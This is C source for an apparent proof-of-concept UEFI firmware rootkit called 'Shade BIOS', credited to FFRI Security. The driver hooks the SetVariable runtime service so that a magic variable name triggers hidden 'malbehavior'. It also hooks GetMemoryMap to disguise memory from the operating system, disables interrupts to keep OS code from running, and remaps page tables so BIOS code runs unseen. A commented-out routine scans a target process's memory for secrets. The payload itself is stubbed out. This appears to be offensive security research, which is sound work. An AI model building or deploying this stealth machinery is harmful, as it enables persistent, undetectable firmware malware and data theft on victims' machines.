/*
 * (c) FFRI Security, Inc., 2025 / Author: FFRI Security, Inc.
 */

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/DevicePathLib.h>
#include <Library/IoLib.h>
#include <Library/PrintLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/VarPrintLib.h>
#include <Protocol/ServiceBinding.h>
#include "common.h"
#include "pe.h"
#include "nt.h"
#include "paging.h"
#include "identity.h"
#include "Mutex.h"
#include "Services.h"
#include "Debug.h"
#include "Interrupt.h"
#include "RuntimeBiosHeap.h"
#include "MemDisguise.h"
#include "Event.h"
#include "Network.h"
#include "Usb.h"
#include "Variable.h"
/*#include "Processor.h"*/
/*#include "Ntfs.h"*/
#include "ProcessStealer.h"
#include "RestoreDeviceSettings.h"
#include "Compatibility.h"
#include <Protocol/Timer.h>

EFI_SET_VARIABLE gOrigSetVariable;

EFI_GUID gEfiEventVirtualAddressChangeGuid = \
  { 0x13FA7698, 0xC831, 0x49C7, { 0x87, 0xEA, 0x8F, 0x43, 0xFC, 0xC2, 0x51, 0x96 }};
EFI_EVENT gEfiEventVirtualAddressChange = NULL;


/**

  Enter Shade BIOS operation 
    * Allows boot-only BIOS code to run by,
      * Partial identity mapping: allows code to execute on 'physical' address
      * Restoring UEFI services and System Table
      * Initializing runtime BIOS heap: Adjust BIOS memory allocator to not to use OS memory region
      * Multi to Single Core: Disallow OS code to execute

**/
static inline
VOID
EFIAPI
ShadeBiosEnter(
    )
{
  // gRT vir => phy
  RTVirToPhy();

  // >>> Switch to partial identity mapping
  EnablePartialIdentityMapping();

  // Restore gBS & gST
  RestoreBsSt();

  // Multi to Single Core
  /*SwitchToBsp();*/
  /*DisableAp();*/

  // Redirect EfiLoaderData/Code allocation to EfiRuntimeServicesData/Code
  RedirectLoaderTypeAllocation();

  // Initialize Pseudo Timer Events
  InitPseudoTimer();

  // Disable Interrupt to Prevent OS code execution
  DisableExternalInterrupt();

  // Don't let allocator use OS memory region
  InitHeap();

  // Deal with some resources for compatibility
  CompatibilityRsrc();
}



/**

  Exit Shade BIOS operation 
    * Restore the original (OS) execution environment by restoring page table

**/
static inline
VOID
EFIAPI
ShadeBiosExit(
    )
{
  // Enable Interrupts
  EnableExternalInterrupt();

  // Resume APs
  /*EnableAp();*/

  // <<< Switch back paging
  DisablePartialIdentityMapping();

  // gRT phy => vir
  RTPhyToVir();
}



#define MAGIC_VAR_NAME L"MyRtDxeTrig"
BOOLEAN gDone = FALSE;
/**

  [omitted] SetVariable Hook
    - Trigger this Shade BIOS malbehavior when called with MAGIC_VAR_NAME
    - Hook gRT->GetVariable() instead to trigger this automatically (without client program)

**/
EFI_STATUS
EFIAPI
SetVariableHook(
    IN  CHAR16    *VariableName,
    IN  EFI_GUID  *VendorGuid,
    IN  UINT32    Attributes,
    IN  UINTN     DataSize,
    IN  VOID      *Data
    )
{
  EFI_STATUS Status;

  if(VariableName!=NULL && StrnCmp(VariableName, MAGIC_VAR_NAME, (sizeof(MAGIC_VAR_NAME)/sizeof(CHAR16))-1) == 0) {
    if(gDone) {
      return EFI_SUCCESS;
    }

    //
    // Requires 1 kernel export that doesn't affect the stealthiness of ShadeBios
    //   - MmGetVirtualForPhysical: Only OS knows the virtual addr of page tables
    //
    ResolveNtosExport();
    

    // Scan process memory for secrets
    //   - Access process memory before ShadeBiosEnter()
    char SecretData[100];
    UINTN SecretDataLen = 0;
    /*
     *ScanProcessMemory(
     *    "TargetProc.exe",
     *    ".data",
     *    "secret",
     *    7,
     *    SecretData,
     *    &SecretDataLen
     *    );
     */
    AsciiStrCpyS(SecretData, 100, "MsgFromShadeBios"); // Demo: strings.exe this string
    SecretDataLen = AsciiStrLen(SecretData)+1;


    // ---------------------- Enter Shade BIOS malbehavior -----------------------------
    ShadeBiosEnter();

    // -- malbehavior --

    ShadeBiosExit();
    // ---------------------- Exit Shade BIOS malbehavior -----------------------------

    gDone = TRUE;
    return Status;
  }

  return gOrigSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data); 
}



EFI_GET_MEMORY_MAP gOrigGetMemoryMap;
/**

  [Omitted] Disguise memory map giving to the OS
    - Don't use Print() here because some system will crash
      when used in phy=>vir address transitioning phase
    - Or patch Print() to work in runtime

**/
EFI_STATUS
EFIAPI
GetMemoryMapHook (
    IN OUT  UINTN                  *MemoryMapSize,
    OUT     EFI_MEMORY_DESCRIPTOR  *MemoryMap,
    OUT     UINTN                  *MapKey,
    OUT     UINTN                  *DescriptorSize,
    OUT     UINT32                 *DescriptorVersion
    )
{
  EFI_STATUS Status;

  Status = gOrigGetMemoryMap(
      MemoryMapSize,
      MemoryMap,
      MapKey,
      DescriptorSize,
      DescriptorVersion
      );

  if (Status!=EFI_SUCCESS) {
    return Status;
  }

  //
  // Modify memory map!
  //
  return Status;
}



VOID
EFIAPI
SetVirtualAddressMapEvent(
    IN  EFI_EVENT  Event,
    IN  VOID       *Context
    )
{
  gRT->ConvertPointer(0, (VOID**)&gOrigSetVariable);
  gRT->ConvertPointer(0, (VOID**)&gRTcopyPhy);
  gRT->ConvertPointer(0, (VOID**)&gRT);
  gRT->ConvertPointer(0, (VOID**)&gIdentityCR3);
}



EFI_STATUS
EFIAPI
DriverEntry (
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
  EFI_STATUS Status;
  Print(L">>> Shade BIOS DriverEntry\n");

  //
  // Execute this driver only once
  //
  if(!CheckMutex())
    return EFI_SUCCESS;

  //
  // If you want to use BIOS Network Stack in runtime
  //
  EnableNetworkStackIfDisabled();
  Print(L"Network Stack is enabled\n");

  // 
  // Prepare Identity Page Tables
  //
  MakeIdentityPageTable();
  Print(L"MakeIdentityPageTable done\n");

  //
  // Save gST/gBS/gRT
  //
  SaveStBsRt();
  Print(L"SaveStBsRt done\n");

  //
  // Save Boot-only UEFI Variables
  //
  SaveBootOnlyVariables();
  Print(L"SaveBootOnlyVariables done\n");

  // 
  // Create SetVirtualAddressMap Event
  //
  Status = gBS->CreateEventEx(
      EVT_NOTIFY_SIGNAL,
      TPL_NOTIFY,
      SetVirtualAddressMapEvent,
      NULL,
      &gEfiEventVirtualAddressChangeGuid,
      &gEfiEventVirtualAddressChange
      );
  Print(L"CreateEvent(SetVirtualAddressMapEvent) %r\n", Status);

  //
  // Hook SetVariable (Triggers this module at runtime)
  //
  EFI_TPL tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);

  gOrigSetVariable = gRT->SetVariable;
  gRT->SetVariable = SetVariableHook;
  gOrigGetMemoryMap = gBS->GetMemoryMap;
  gBS->GetMemoryMap = GetMemoryMapHook;
  
  gST->Hdr.CRC32 = 0;
  gBS->CalculateCrc32(&gST->Hdr, gST->Hdr.HeaderSize, &gST->Hdr.CRC32);
  gBS->RestoreTPL(tpl);
  Print(L"Hooked SetVariable & GetMemoryMap\n");

  Print(L"<<< End of DriverEntry\n");
  return EFI_SUCCESS;
}
